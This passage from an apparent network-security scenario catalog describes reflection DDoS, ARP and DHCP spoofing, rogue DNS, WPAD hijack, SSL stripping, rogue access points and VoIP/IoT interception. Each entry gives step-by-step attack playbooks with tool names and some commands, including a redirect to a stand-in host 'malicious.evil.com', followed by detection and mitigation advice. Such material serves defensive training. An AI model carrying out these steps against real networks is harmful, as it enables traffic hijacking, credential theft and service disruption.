Attack Steps: Step 1: Attacker scans for Windows or legacy systems with UDP port 137 open using nmap or similar tools.Step 2: Crafts NetBIOS Name Service (NBNS) query packets using Scapy or prebuilt NetBIOS reflection scripts like netbios-reflect.py, spoofing the victim’s IP as the source.Step 3: Sends the forged NBNS packets to vulnerable hosts.Step 4: Hosts respond with 2–5x larger reply containing machine name and other NBNS data directly to the victim.Step 5: Repeated across many hosts, this floods the victim with amplified traffic.Step 6: Though amplification is low, volume from many sources still disrupts smaller networks.Step 7: Detection includes observing UDP/137 spikes and unsolicited NBNS responses.Step 8: Defenders should disable NetBIOS over TCP/IP (found in network adapter settings in Windows).Step 9: Firewall rules should block UDP/137 from external networks.Step 10: Enterprise networks should shift entirely to modern name resolution (DNS).
Impact: Basic DDoS from legacy name resolution
Detection Method: Monitor UDP/137 traffic; log excessive NBNS responses
Solution: Disable NetBIOS over TCP/IP; block UDP/137 externally; use DNS and modern protocols

Title: DCE-RPC Reflection
Scenario Description: Distributed Computing Environment - Remote Procedure Call (DCE-RPC) over UDP/135 can be tricked into replying to spoofed packets, reflecting traffic.
Attack Steps: Step 1: Attacker identifies systems running Windows DCE-RPC services on UDP port 135 using tools like rpcdump or nmap with service detection flags.Step 2: Crafts a spoofed DCE-RPC query that will cause the server to reply with endpoint mapping info.Step 3: Spoofs the victim's IP address as the source of the packet using Scapy or raw socket tools.Step 4: Sends multiple requests to vulnerable DCE-RPC services.Step 5: Each service responds with a variable-sized payload to the victim, reflecting and amplifying the traffic.Step 6: While amplification varies, a coordinated attack across multiple DCE-RPC endpoints causes sustained load.Step 7: Detection includes monitoring UDP/135 spikes and looking for unusual RPC responses without matching requests.Step 8: Block UDP/135 at the network perimeter unless explicitly needed.Step 9: Use Group Policy or registry settings to disable DCE over UDP in enterprise environments.Step 10: Prefer authenticated TCP-based RPC where possible to reduce attack surface.
Vulnerability: DCE-RPC responds to spoofed UDP packets
Impact: Disruption of RPC services, DDoS potential
Detection Method: Watch for unsolicited UDP/135 traffic and large DCE-RPC replies
Solution: Disable DCE-RPC over UDP; block port 135 externally; enforce secure RPC settings

Title: Steam A2S_INFO Reflection
Attack Type: Reflection via Source Engine Game Query Abuse
Scenario Description: Steam servers (using Source engine) reply to spoofed A2S_INFO queries with amplified server info, reflecting to victim IP.
Attack Steps: Step 1: Attacker searches for online multiplayer game servers using the Source engine (e.g., Counter-Strike, TF2) listening on UDP (varies, often 27015+).Step 2: Uses nmap or online lists to find IPs of open servers.Step 3: Crafts spoofed A2S_INFO queries (used by Steam clients to get game info), setting victim’s IP as source, using tools like steam-query or Scapy.Step 4: Each server responds with server name, map, player count, etc., often 5–15x the request size.Step 5: A large number of servers can generate significant reflection-based DDoS toward the victim.Step 6: Detection includes observing UDP responses from unusual game ports and to unintended IPs.Step 7: Server operators should rate-limit A2S_INFO requests or require a challenge-response for queries.Step 8: Firewalls should block UDP traffic from known malicious IPs.Step 9: Game server software should enforce Steam query protection settings.Step 10: ISPs should apply BCP 38 to prevent IP spoofing abuse.
Vulnerability: A2S_INFO replies to spoofed UDP queries
Impact: Medium-bandwidth DDoS against public game services
Detection Method: Monitor for high UDP traffic to/from game ports; alert on mismatched queries
Solution: Enable rate limits or challenge for A2S_INFO; firewall game query ports as needed

Title: Custom Protocol Reflection
Attack Type: Reflection using Non-Standard or Proprietary Protocols
Scenario Description: Attackers exploit custom or unknown UDP-based protocols that reply to spoofed packets, turning them into reflection amplifiers.
Tools Used: Wireshark, nmap, custom crafted tools, fuzzers
Attack Steps: Step 1: Attacker performs reconnaissance using nmap, fuzzers, or Wireshark to identify services running on unusual or high UDP ports (e.g., 50000+).Step 2: Sends exploratory packets to find whether these services respond to UDP requests without authentication.Step 3: Once a vulnerable protocol is found, attacker reverse-engineers the request/response pattern (e.g., probe = 40 bytes, response = 400 bytes).Step 4: Spoofs the victim’s IP in the request and sends a flood of spoofed packets to these servers.Step 5: Servers respond to the victim with much larger packets, amplifying traffic (amplification depends on protocol design).Step 6: Detection is hard unless DPI or heuristics flag abnormal behavior on high ports.Step 7: Defenders must log all outbound UDP traffic and block unknown high-port UDP servers.Step 8: Developers of proprietary services should implement request validation and authentication.Step 9: Regular protocol audits help detect misconfigurations.Step 10: Apply IP spoof protection (BCP 38) at network edge.
Vulnerability: Custom UDP protocol reflects to spoofed IP
Impact: Varies – may range from 5x to 100x depending on logic
Detection Method: Monitor unusual high-port UDP traffic; enable anomaly detection for unknown protocols
Solution: Require auth for custom protocols; restrict UDP services; monitor and audit high ports

Title: Fake Gateway Assignment
Attack Type: ARP Spoofing for Default Gateway Hijack
Scenario Description: Attacker poisons ARP cache to trick devices into thinking their machine is the gateway, enabling full traffic interception and manipulation.
Attack Steps: Step 1: Attacker connects to the same LAN or Wi-Fi as the victim.Step 2: Uses a tool like arpspoof or Bettercap to send forged ARP replies to the victim.Step 3: These ARP replies tell the victim that the attacker's MAC address belongs to the default gateway IP (e.g., 192.168.1.1).Step 4: The victim updates its ARP cache, sending all traffic to the attacker instead of the real gateway.Step 5: Attacker enables IP forwarding or a NAT service to relay traffic, maintaining internet access for the victim (to avoid suspicion).Step 6: While traffic passes through, attacker can sniff passwords, cookies, session tokens using Wireshark or sslstrip.Step 7: Can inject malicious payloads or redirect victims to phishing pages.Step 8: Detection includes duplicate ARP responses or MAC address anomalies for the gateway IP.Step 9: Use ARP monitoring or dynamic ARP inspection in switches.Step 10: Defend with static ARP tables, port security, or network segmentation.
Vulnerability: ARP cache can be poisoned by attacker
Impact: Full traffic hijack, credential theft, session takeover
Detection Method: Detect MAC/IP mismatches, excessive ARP replies
Solution: Enable DHCP snooping, use static ARP, employ ARP spoof detection tools

Title: Rogue DNS Server Injection
Scenario Description: Attacker responds to DHCP requests with malicious DNS server address → victim uses attacker-controlled resolver.
Tools Used: dnschef, Responder, Bettercap, DHCP starvation tools
Attack Steps: Step 1: Attacker joins the same LAN or Wi-Fi network as the victim (e.g., public hotspot).Step 2: Monitors DHCP traffic to see when clients request IP configuration.Step 3: Uses tools like Responder or Bettercap to send a fake DHCP offer with a forged DNS server IP (pointing to attacker-controlled DNS like dnschef).Step 4: Victim accepts this offer and configures the rogue DNS server.Step 5: Victim now resolves all domains through the attacker’s server.Step 6: Attacker can return fake IPs for legitimate sites (e.g., facebook.com → phishing server).Step 7: Can silently redirect or inject malware via trusted domain names.Step 8: Detection includes DNS resolutions going to unusual or internal IPs.Step 9: Monitor DHCP logs and DNS resolver usage per client.Step 10: Defend by hardcoding DNS or using DHCP snooping to block unauthorized DHCP servers.
Vulnerability: DHCP lacks authentication, accepts forged DNS offers
Impact: Full domain hijack, phishing, malware injection
Detection Method: Detect rogue DHCP servers, monitor DNS query destinations
Solution: Enable DHCP snooping, restrict DNS server config, use DNSSEC validation
Tags: Rogue DNS, DHCP Injection, DNS Hijack

Title: Forced Proxy Configuration
Scenario Description: Attacker injects malicious Proxy Auto Config (PAC) or WPAD file via DHCP or NetBIOS, redirecting victim's web traffic through attacker proxy.
Attack Steps: Step 1: Victim connects to a network with no proxy explicitly set.Step 2: Attacker sends a rogue DHCP response that includes option 252 (proxy auto-config URL).Step 3: Alternatively, attacker responds to WPAD hostname broadcast (via NetBIOS or DNS) with their IP, hosting a malicious wpad.dat file.Step 4: Victim browser fetches this file and follows its logic to route all HTTP/HTTPS traffic via attacker’s proxy.Step 5: Attacker sees full web requests including credentials, cookies, sessions.Step 6: Can inject malicious JavaScript or redirect to phishing sites.Step 7: Traffic can be manipulated in real-time using mitmproxy or Burp Suite.Step 8: Detection includes observing unexpected proxy usage or HTTP headers.Step 9: Disable automatic proxy detection in browser settings.Step 10: Block WPAD and DHCP option 252 usage in networks without need.
Impact: Full browser traffic hijack, phishing, session theft
Detection Method: Watch for PAC/WPAD file requests; monitor outbound proxy usage
Solution: Disable auto proxy detect; disable WPAD; block DHCP 252; configure proxy manually
Tags: WPAD, PAC, Proxy Injection, DHCP Attack

Title: Network Scanning/Profiling
Scenario Description: Attacker scans local subnet to map active hosts, open ports, OS types, and security posture to plan follow-up exploitation.
Attack Steps: Step 1: Attacker connects to target network (wired, wireless, or VPN).Step 2: Uses netdiscover or arp-scan to identify live hosts and their MAC/vendor info.Step 3: Runs nmap -sP or fping to map reachable devices.Step 4: Uses nmap -sS -A for SYN scan with OS detection and service enumeration.Step 5: Identifies open ports (e.g., 22, 80, 445, 3389), running services (Apache, Samba), and probable OS (Windows, Linux, etc).Step 6: Captures network traffic using Wireshark to see protocols used, broadcast messages, DHCP offers, or leaked credentials.Step 7: Results help attacker choose targets for lateral movement, privilege escalation, or phishing.Step 8: Detection includes port scan alerts, ARP floods, and anomalous DNS queries.Step 9: Use IDS/IPS like Suricata or Snort to catch scanning signatures.Step 10: Segment internal networks and apply port isolation or NAC to restrict visibility.
Vulnerability: Unrestricted local scan, open service discovery
Detection Method: IDS/IPS alerts on scans; detect ARP/DNS flooding
Solution: Use VLAN segmentation; apply NAC policies; detect scans using flow analysis

Title: Data Interception & Sniffing
Scenario Description: Attacker captures and analyzes network packets using sniffers to collect sensitive data like passwords, files, and sessions transmitted in plaintext.
Attack Steps: Step 1: Attacker connects to the same network segment (wired or wireless) as the target (e.g., public Wi-Fi, LAN).Step 2: Uses Wireshark or tcpdump in promiscuous mode to capture all packets on the interface.Step 3: Applies filters to capture interesting traffic like http, ftp, telnet, or pop3, which are often unencrypted.Step 4: Analyzes the packet content to find credentials, form submissions, cookies, file transfers, etc.Step 5: May also capture broadcast packets like NetBIOS, mDNS, or SSDP, revealing internal device names.Step 6: Uses tshark to automate filtering and export of credential-related strings.Step 7: Since sniffing is passive, it is stealthy and hard to detect.Step 8: Detection involves monitoring interface modes or IDS alerts on unusual traffic captures.Step 9: Protect against this by enforcing HTTPS, disabling plaintext protocols, and using VPNs.Step 10: Segment network traffic with VLANs to isolate sensitive traffic.
Vulnerability: Use of HTTP, FTP, POP3 without encryption
Impact: Credential theft, data leaks, privacy loss
Detection Method: Monitor for NICs in promiscuous mode; audit for unexpected packet captures
Solution: Enforce HTTPS and encrypted services; disable legacy protocols; use VPNs to tunnel sensitive data

Title: Credential Harvesting
Attack Type: MITM Credential Capture via ARP/DNS Spoofing
Scenario Description: Attacker sits in the middle and captures sensitive credentials, session tokens, or auth cookies transmitted by unaware victims.
Attack Steps: Step 1: Attacker joins the same local network (e.g., coffee shop Wi-Fi).Step 2: Launches ARP spoofing using Bettercap or Ettercap, making victim believe attacker is the gateway.Step 3: Enables IP forwarding to allow traffic to flow normally through the attacker’s machine.Step 4: Uses sslstrip to downgrade HTTPS links to HTTP where possible, making credentials readable.Step 5: Captures POST data, cookies, sessions, and API tokens from login forms or app traffic.Step 6: Uses Wireshark or mitmproxy to parse HTTP requests and extract cleartext credentials.Step 7: Can reuse cookies to hijack sessions (e.g., Facebook, email, admin panels).Step 8: Detection includes duplicate MAC addresses or DNS poisoning attempts.Step 9: Deploy dynamic ARP inspection or client isolation to prevent this.Step 10: Use HSTS, enforce HTTPS-only traffic, and implement MFA for all services.
Detection Method: Detect ARP/DNS anomalies; alert on HTTP logins; monitor duplicate MACs
Solution: HSTS, MFA, encrypted sessions; block ARP spoofing; isolate Wi-Fi clients

Title: DNS Rebinding Attack
Attack Type: Bypass Same-Origin Policy to Access Internal Hosts
Scenario Description: Attacker tricks the browser into thinking an internal service is part of an external trusted site using dynamic DNS IP changes.
Tools Used: DNSRebind, Burp, custom DNS server, rebind-toolkit
Attack Steps: Step 1: Attacker hosts a malicious webpage or ad that loads in the victim’s browser.Step 2: This page references a subdomain like rebind.attacker.com which points to the attacker’s DNS server.Step 3: When the victim’s browser loads the page, it resolves rebind.attacker.com to an external IP (initially attacker-controlled).Step 4: After initial connection, the attacker changes DNS to point rebind.attacker.com to an internal IP (e.g., 127.0.0.1, 192.168.1.1).Step 5: Browser now thinks the internal IP is the same-origin as attacker site, allowing JavaScript access.Step 6: JavaScript in the page scans internal services (e.g., router admin panel, API server) and sends data back to attacker.Step 7: May expose AWS credentials, NAS dashboards, or printer controls.Step 8: Detection includes watching for internal requests made by browsers to external domains.Step 9: Defend by blocking DNS rebinding via router settings or using DNS servers that validate responses (e.g., Google DNS blocks private IPs).Step 10: Use firewall rules to prevent browser access to local IPs from external domains.
Target Type: Browsers behind NAT or internal net
Detection Method: Watch for external domain loading internal IPs; browser logs and DNS queries
Solution: Disable DNS rebinding in router; enforce internal-only IP access; validate DNS responses
Tags: Web Exploit, DNS Abuse, Internal Discovery

Title: Redirect to Exploit Server
Attack Type: HTTP Redirect to Malicious Payload Server
Scenario Description: Attacker intercepts or injects HTTP redirect responses, pointing victims to exploit servers that deliver malware or browser-based RCE.
Tools Used: Bettercap, Responder, custom proxy, Evilgrade, msfvenom
Attack Steps: Step 1: Attacker sets up an HTTP server (or proxy) hosting malicious content (e.g., JavaScript, macro payload, Java applet, browser exploit).Step 2: Launches a MITM attack using ARP/DNS spoofing or compromise of an upstream server.Step 3: Modifies the HTTP response headers to include HTTP 302 Redirect pointing to the malicious server (e.g., Location: http://malicious.evil.com or IP address).Step 4: Victim browser follows the redirect automatically and loads the exploit.Step 5: Exploit delivers payload like meterpreter reverse shell, macro-laced document, or browser zero-day.Step 6: Attacker now controls the victim system remotely.Step 7: Can also target update servers, replacing legitimate updates with malware using tools like Evilgrade.Step 8: Detection involves inspecting unexpected HTTP redirects, odd domains in logs, or certificate mismatches.Step 9: Use HTTPS and strict transport security to prevent redirection manipulation.Step 10: Apply egress filtering and browser hardening policies to block access to known bad hosts.
Vulnerability: Trusting HTTP redirect chains or DNS injection
Impact: Malware delivery, remote access, system compromise
Detection Method: Monitor DNS and HTTP logs for 302 redirects; inspect for malware servers
Solution: Force HTTPS; block malicious domains; implement DNS filtering and traffic validation

Title: SSL Downgrade or Stripping
Scenario Description: Attacker performs MITM via ARP spoofing and prevents the use of HTTPS, forcing the victim to use unencrypted HTTP instead.
Attack Steps: Step 1: Attacker connects to the same LAN/Wi-Fi network as the victim (e.g., public Wi-Fi).Step 2: Launches ARP spoofing using Bettercap or arpspoof, making the victim route all traffic through the attacker.Step 3: Attacker enables IP forwarding to maintain internet access for the victim.Step 4: Uses sslstrip to intercept HTTPS requests and convert them to HTTP transparently.Step 5: Victim unknowingly visits sites over HTTP even if they typed "https://" or clicked on an HTTPS link.Step 6: Attacker reads login credentials, cookies, and other sensitive data transmitted in cleartext.Step 7: Wireshark is used to capture and analyze stolen credentials.Step 8: Attack is especially effective on sites not using HSTS (HTTP Strict Transport Security).Step 9: Detection involves unexpected HTTP usage for sensitive domains, or users seeing "Not Secure" warnings.Step 10: Defend by enabling HSTS on web servers, using VPNs, and monitoring for ARP spoofing behavior.
Vulnerability: Lack of HSTS + ARP spoofing enabling MITM
Detection Method: Monitor downgrade attempts; check for HTTP on known HTTPS sites
Solution: Enable HSTS, use secure DNS, implement certificate pinning

Title: Bypass Captive Portals
Scenario Description: Attacker tricks devices into thinking they have internet access by spoofing captive portal checks or faking success responses.
Attack Steps: Step 1: Victim joins a Wi-Fi network (e.g., hotel, airport) that requires a captive portal login.Step 2: Attacker sets up their own rogue access point (AP) with the same SSID using hostapd.Step 3: Attacker configures the fake AP with a DHCP server and DNS resolver (e.g., via dnsmasq) to assign IPs and resolve all DNS requests to attacker-controlled IP.Step 4: Victim device performs a connectivity check by requesting known URLs (e.g., http://clients3.google.com/generate_204).Step 5: Attacker responds with fake HTTP 200 OK status, tricking the OS into thinking captive portal login succeeded.Step 6: Device enables full internet access without logging into the real captive portal.Step 7: Attacker can now perform MITM on all traffic, steal credentials, and redirect to phishing/malware pages.Step 8: Detection is difficult unless captive portal infrastructure monitors for spoofed DNS/IP.Step 9: Defend by using HTTPS for captive portal auth pages, validating MAC address associations, and using 802.1X.
Vulnerability: OS uses insecure HTTP checks to detect internet
Detection Method: Monitor for rogue APs; detect unexpected portal bypasses
Solution: Use secure captive portal auth, MAC filtering, enforce 802.1X
Tags: Wi-Fi, Rogue AP, Captive Portal Spoof

Title: MITM for VoIP / SIP
Scenario Description: Attacker intercepts VoIP SIP call setup and RTP audio streams to eavesdrop, record, or inject fake audio.
Attack Steps: Step 1: Attacker connects to the same network where VoIP traffic is flowing (e.g., office LAN or VLAN with phones).Step 2: Uses ARP spoofing with arpspoof or Ettercap to become the MITM between VoIP phones and the PBX server.Step 3: Captures SIP signaling traffic and RTP audio streams using Wireshark or sipdump.Step 4: SIP headers reveal caller/callee, phone numbers, codecs, and call metadata.Step 5: RTP streams can be reconstructed into audio using rtpdump and play commands.Step 6: Attacker can optionally inject fake RTP packets to produce noise, redirect calls, or break audio.Step 7: If SIP is unencrypted, attacker can even impersonate devices and make calls.Step 8: Detection includes duplicate MACs, RTP loss spikes, or unexpected SIP errors.Step 9: Use TLS for SIP and SRTP for RTP encryption.Step 10: Segment VoIP networks with VLANs, enforce device authentication.
Impact: Call interception, impersonation, voice data leak
Detection Method: VoIP QoS monitoring; alerts on SIP anomalies
Solution: Use TLS/SRTP; segment VoIP; disable unused SIP/UDP ports
Tags: VoIP MITM, SIP Sniffing, Audio Intercept

Title: MITM for IoT Devices
Attack Type: Hijack IoT Communication via Local Network
Scenario Description: Attacker intercepts or manipulates unencrypted communication of smart devices (e.g., cameras, bulbs, locks) on local networks.
Attack Steps: Step 1: Attacker scans the local network using nmap to identify IoT devices (e.g., ports 80, 554, 8883).Step 2: Uses ARP spoofing to redirect IoT traffic through attacker device.Step 3: Monitors data from devices using Wireshark or tshark, filtering for MQTT, HTTP, or RTSP protocols.Step 4: If devices communicate in plaintext (e.g., unencrypted MQTT or HTTP), attacker can read status updates, control commands, and API keys.Step 5: Uses mitmproxy to inject new commands, change configurations, or disable features (e.g., turn off a camera or unlock a door).Step 6: May replace firmware updates or DNS resolutions to redirect to malicious servers.Step 7: Detection includes strange device behavior (e.g., lights toggling, camera off unexpectedly).Step 8: Monitor ARP traffic and IoT logs for anomalies.Step 9: Secure IoT by enabling encryption (TLS/MQTTs), changing default passwords, and isolating devices.Step 10: Use firewalls to restrict device communication to only known domains/IPs.
Vulnerability: IoT uses insecure protocols or weak auth
Impact: Device takeover, surveillance tampering, home breach
Detection Method: Monitor device logs; detect ARP/DNS spoofing attempts
Solution: Enforce TLS, network segmentation, restrict firmware URLs, change defaults
Tags: IoT MITM, MQTT Sniffing, Smart Device Hijack

Title: MITM via Fake Default Gateway
Scenario Description: Attacker tricks devices into routing traffic through their system by assigning themselves as the default gateway (e.g., via rogue DHCP or manual config).
Attack Steps: Step 1: Attacker connects to the same LAN or Wi-Fi as target devices (e.g., office or hotel network).Step 2: Sets up a rogue DHCP server using dnsmasq that issues IP leases with the attacker’s machine as the default gateway.Step 3: Target device accepts the IP config automatically and routes all traffic through the attacker.Step 4: Attacker enables packet forwarding and uses iptables to NAT traffic to maintain connectivity for the victim.Step 5: All victim traffic (DNS, web, mail, etc.) is now visible and modifiable by the attacker.Step 6: Attacker can sniff traffic using Wireshark, inject JavaScript, redirect requests, or harvest credentials.Step 7: Detection includes duplicate DHCP servers, incorrect gateway MAC addresses, or device traffic spikes.Step 8: Protect by enabling DHCP snooping and static gateway configurations.Step 9: Use client firewall rules to restrict gateway changes and validate DHCP source.Step 10: Monitor for rogue gateways using ARP monitoring tools.
Detection Method: Detect duplicate DHCP servers; check default gateway changes in logs
Solution: Use DHCP snooping, restrict DHCP servers, use 802.1X

Title: DNS Poisoning via Fake DNS Server
Scenario Description: Attacker sets up a rogue DNS server and intercepts DNS requests, returning malicious IPs for trusted domains to redirect users to fake or malicious websites.
Attack Steps: Step 1: Attacker connects to the victim’s network (wired or wireless).Step 2: Runs ARP spoofing to redirect victim traffic to attacker system.Step 3: Launches a rogue DNS server (e.g., using dnsmasq or dnsspoof) to respond to DNS queries faster than the real server.Step 4: When victim tries to visit a site (e.g., facebook.com), attacker responds with the IP of a malicious phishing page.Step 5: Victim unknowingly lands on fake site that looks identical to the original, hosted by attacker.Step 6: Attacker captures credentials, cookies, or delivers malware.Step 7: Optional: Attacker can poison DNS cache for persistence using TTL tricks.Step 8: Detection includes mismatch of DNS responses, wrong IPs, or DNS traffic going to local machines.Step 9: Monitor DNS response times and source IPs.Step 10: Defend with DNSSEC, DoH (DNS over HTTPS), or trusted DNS providers like Quad9 or Google DNS.
Vulnerability: DNS queries not validated or encrypted
Detection Method: Monitor DNS traffic origin; alert on unexpected domain-IP mappings
Solution: Use DNSSEC, DoH, hardcode DNS, inspect local DNS resolver configuration

Title: WPAD Proxy Hijack
Scenario Description: Attacker abuses the WPAD protocol by offering a malicious PAC (Proxy Auto-Config) file via DHCP or DNS to control browser traffic through their proxy.
Attack Steps: Step 1: Victim connects to a corporate or public network.Step 2: Attacker sets up a rogue DHCP server or DNS server that advertises wpad as a hostname.Step 3: Victim’s browser automatically requests http://wpad/wpad.dat to get proxy settings.Step 4: Attacker serves a malicious wpad.dat (PAC) file containing a proxy script that routes traffic to attacker system.Step 5: Victim’s browser now routes all traffic through attacker-controlled proxy.Step 6: Attacker can log traffic, inject scripts, redirect users to phishing sites, or break sessions.Step 7: Works even in many corporate setups unless WPAD is disabled or authenticated.Step 8: Detection includes unexpected PAC file downloads, new proxy settings in system logs, or proxy logs.Step 9: Block WPAD via GPO (Group Policy), disable auto proxy detection, and monitor PAC file usage.Step 10: Educate users to look for browser proxy alerts and use HTTPS enforcement tools.
Vulnerability: WPAD enabled without secure proxy validation
Impact: Full control of browser traffic, phishing, injection
Detection Method: Monitor PAC requests; inspect WPAD logs; disable auto proxy detection in policy
Solution: Disable WPAD via GPO; enforce manual proxy settings; filter WPAD DNS/DHCP responses
Tags: Proxy Hijack, WPAD Abuse, PAC Injection

Title: Traffic Redirection to Exploit Server
Attack Type: Redirect Victim to Remote Exploit Payload Server
Scenario Description: Attacker alters network traffic (via MITM) to redirect legitimate requests to a malicious server hosting exploits (e.g., drive-by download, JS payload, malware installer).
Attack Steps: Step 1: Attacker performs ARP spoofing using Bettercap or Ettercap to become a MITM between victim and internet.Step 2: Sets up a malicious web server using Apache, nginx, or Metasploit to host an exploit (e.g., JS-based RCE, malicious PDF, MS Word macro, or fake update).Step 3: Uses iptables to redirect all victim HTTP requests (port 80) to the malicious server’s IP.Step 4: Alternatively, modifies DNS responses to send victim to exploit server.Step 5: Victim loads the exploit page, which silently downloads malware or launches browser-based attacks.Step 6: Attacker gains remote access via reverse shell, meterpreter, or malware beaconing.Step 7: Detection includes sudden redirects, fake update prompts, or antivirus alerts.Step 8: Monitor DNS/IP anomalies, blocked domains, and unexpected traffic redirection.Step 9: Use full HTTPS/TLS with HSTS, avoid HTTP redirects, and inspect DNS behavior.Step 10: Implement endpoint protections to block malware delivery via redirection.
Detection Method: Monitor for unexpected redirects; use SSL inspection; analyze firewall egress rules
Solution: Use HSTS, block HTTP, filter DNS; use endpoint antivirus and egress controls
Tags: MITM Redirection, Exploit Delivery, Fake Updates

Title: Access Control Bypass via IP Spoof
Scenario Description: Attacker impersonates trusted internal device IPs (like printers, admin panels, SIP gateways) to bypass access controls or firewall rules.
Attack Steps: Step 1: Attacker connects to internal network (e.g., via Ethernet or open Wi-Fi).Step 2: Identifies IP addresses of internal trusted services using nmap (e.g., IP of printer: 10.0.0.50).Step 3: Disconnects or ARP-spoofs the legitimate device to avoid IP conflict.Step 4: Manually assigns the spoofed IP address to attacker's device using ifconfig eth0 10.0.0.50 netmask 255.255.255.0 up.Step 5: Attacker sends requests to internal services or admin panels that have IP-based access controls (e.g., firewall allows 10.0.0.50 to access admin.dashboard.local).Step 6: Attacker gains elevated access, bypasses authentication, or invokes APIs.Step 7: Optional: Uses iptables to redirect traffic for persistence.Step 8: Detection includes IP conflict logs, ARP table changes, or MAC/IP mismatches.Step 9: Monitor for device impersonation using ARP watch, DHCP logs, or NAC systems.Step 10: Defend by enforcing MAC binding and using real auth instead of trusting IP alone.
Vulnerability: IP-based firewall rules or trust zones
Detection Method: MAC address mismatch alerts; detect duplicate IP ARP announcements
Solution: Avoid IP-based access control; bind MAC/IP pairs; use multi-factor authentication
Tags: IP Spoof, Access Control Bypass, Privilege Escalation

Title: Subnet Reassignment Attack
Scenario Description: Attacker provides clients with incorrect subnet info via DHCP, breaking internal segmentation and allowing broader or invalid communication.
Attack Steps: Step 1: Attacker connects to the same internal LAN or Wi-Fi.Step 2: Launches a rogue DHCP server using dnsmasq to respond to DHCP requests.Step 3: Configures the rogue DHCP server to assign an overly large or incorrect subnet mask (e.g., /8 instead of /24).Step 4: Target devices accept the configuration, thinking the entire internal range is directly reachable.Step 5: This bypasses segmentation controls, allowing the victim device to talk to devices across VLANs or security zones.Step 6: Optional: Attacker can isolate clients or redirect traffic by defining specific static routes or gateway IPs.Step 7: Some devices may become unreachable due to incorrect routes.Step 8: Detection includes unusual subnet ranges in client configs or internal communication attempts across zones.Step 9: Monitor DHCP assignments, ARP anomalies, and enforce static routing where possible.Step 10: Prevent rogue DHCP servers using DHCP snooping and 802.1X auth.
Vulnerability: Clients trust DHCP for routing and subnet info
Detection Method: Check for DHCP offers from untrusted MACs; inspect netmask of client IP assignments
Solution: Enable DHCP snooping on switches; enforce static routes and segmentation via VLANs
Tags: Subnet Attack, DHCP Hijack, DoS, Misrouting

Title: IP Conflict / DoS via DHCP
Scenario Description: Attacker causes network outage by assigning already-used IPs via rogue DHCP or manual conflict, leading to collisions and loss of connectivity.
Attack Steps: Step 1: Attacker joins local network (Wi-Fi or Ethernet).Step 2: Runs a rogue DHCP server (dnsmasq) that responds to requests with IPs already in use (e.g., IP of the gateway or DNS server).Step 3: Victim devices get duplicate IPs, causing them to lose connectivity or create instability.Step 4: Alternatively, attacker uses static IP matching existing active IP and broadcasts ARP with that IP, triggering conflict.Step 5: Devices start experiencing random disconnections or fail to route correctly.Step 6: Can also spoof DHCP lease renewal to reset IP addresses of many clients at once.Step 7: Detection includes IP conflict logs in system tray (Windows) or dmesg logs (Linux/Mac).Step 8: Network tools like arpwatch, Wireshark, or switch port security help detect sudden conflicts.Step 9: Use DHCP snooping and static IP assignments to critical devices (e.g., DNS, gateway).Step 10: Block unauthorized DHCP responses using MAC filtering or VLAN isolation.
Vulnerability: DHCP not filtered, no conflict monitoring
Detection Method: Monitor IP conflicts in logs; alert on duplicate IPs or ARP replies
Solution: Implement DHCP snooping; assign critical IPs statically; isolate DHCP with ACLs

Title: Split Routing Attack
Scenario Description: Attacker manipulates routing or DHCP to cause devices to use split paths (internal and external), bypassing intended traffic filters or visibility.
Attack Steps: Step 1: Attacker joins internal network (wired or wireless).Step 2: Runs a rogue DHCP server (dnsmasq) offering default gateway and internal routes that segment traffic.Step 3: Attacker defines specific static routes in the DHCP response (e.g., route 192.168.10.0/24 via attacker IP, all else via real gateway).Step 4: Victim device follows split routing logic and unknowingly sends specific internal traffic to attacker.Step 5: Attacker intercepts sensitive packets (e.g., API calls, SMB traffic) while other traffic continues to internet.Step 6: This selective interception allows stealthy data theft or session hijacking.Step 7: Detection is difficult unless you audit routing tables on clients or monitor interface traffic volume shifts.Step 8: Tools like route, traceroute, and ip route can be used to inspect live paths.Step 9: Prevent by enforcing static routes or disabling route options in DHCP responses.Step 10: Monitor route table changes and rogue DHCP servers offering static routes.
Vulnerability: Clients blindly trust DHCP for route configuration
Impact: Selective MITM, route hijack, data sniffing
Detection Method: Audit routing tables; log new route assignments via DHCP
Solution: Use static routes in OS or enforce DHCP server-only access via switch ACLs and DHCP snooping
Tags: Split Routing, Route Hijack, DHCP Abuse

Title: Rogue DHCP on Wireless Access Point
Scenario Description: Attacker creates a fake Wi-Fi hotspot that gives out DHCP leases and hosts a malicious captive portal to harvest credentials or inject malware.
Attack Steps: Step 1: Attacker uses a wireless adapter in monitor mode and runs airbase-ng -e FreeWiFi -c 6 wlan0mon to create a fake open Wi-Fi network (SSID: FreeWiFi).Step 2: Sets up a DHCP server using dnsmasq to assign IP addresses, default gateway, and DNS pointing to the attacker’s own device.Step 3: Runs a captive portal (HTML login page) using apache2 or Bettercap modules. Page mimics login portals of coffee shops, universities, or airports.Step 4: User connects and is redirected to login page via DNS spoofing or HTTP redirect.Step 5: User enters email, password, or OTP. Data is logged to attacker's server (e.g., /var/www/html/login.php).Step 6: Optionally, attacker injects malicious JavaScript or fake updates.Step 7: After login, user is either redirected to internet (via real NAT), or blocked until they disconnect.Step 8: Detection includes SSID duplication, lack of certificate warnings (HTTPS missing), or Wi-Fi without password.Step 9: Defend using WPA2-Enterprise, avoid open Wi-Fi, and educate users about captive portal phishing.Step 10: Monitor rogue APs using Wi-Fi scanning tools (e.g., Kismet, Acrylic, Wigle).
Vulnerability: Devices connect to open Wi-Fi without validation
Detection Method: Wireless scans; detect duplicate SSIDs; captive portal inspection
Solution: Enforce WPA2-Enterprise; block open Wi-Fi; user awareness training
Tags: Fake AP, Rogue DHCP, Captive Portal Hijack

Title: VoIP / SIP Interception
Scenario Description: Attacker intercepts or redirects VoIP registration and call traffic via rogue SIP server or man-in-the-middle SIP proxy setup.
Attack Steps: Step 1: Attacker connects to the same LAN or VLAN as VoIP phones or softphones.Step 2: Uses Ettercap or Bettercap to ARP spoof the SIP phones and VoIP server.Step 3: Optionally, sets up a rogue SIP proxy (e.g., OpenSIPS, Kamailio, or SIPp) that mimics the real server.Step 4: SIP clients (phones) register via attacker’s proxy, believing it to be legitimate.Step 5: Attacker intercepts SIP registration, voice stream (RTP), or call signaling.Step 6: Can record calls, replay, or redirect to another attacker-controlled destination.Step 7: In some cases, attacker tampers with SIP headers to change destination or inject DTMF commands.Step 8: Detection includes call drops, one-way audio, or unusual call logs.Step 9: Use SIP TLS and SRTP to prevent MITM.Step 10: Defend using VLAN isolation, 802.1X, and static ARP entries for SIP endpoints.
Vulnerability: SIP over UDP, no encryption or server pinning
Detection Method: VoIP log analysis; ARP spoof detection; SIP registration anomalies
